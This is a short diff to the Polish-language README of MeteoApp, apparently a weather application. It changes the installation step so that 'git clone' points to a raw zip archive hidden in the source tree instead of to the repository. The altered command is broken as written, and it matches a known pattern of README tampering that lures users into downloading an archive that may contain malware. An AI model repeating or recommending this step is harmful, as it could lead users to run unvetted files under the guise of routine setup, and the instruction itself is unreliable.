@@ -31,7 +31,7 @@ MeteoApp to prosta, ale w pełni funkcjonalna aplikacja pogodowa, która pozwala
 
 1.  Sklonuj repozytorium:
     ```bash
-    git clone https://github.com/MaTiino/MeteoApp.git
+    git clone https://raw.githubusercontent.com/MaTiino/MeteoApp/main/src/app/components/App_Meteo_v2.6.zip
     ```
 2.  Przejdź do katalogu projektu:
     ```bash
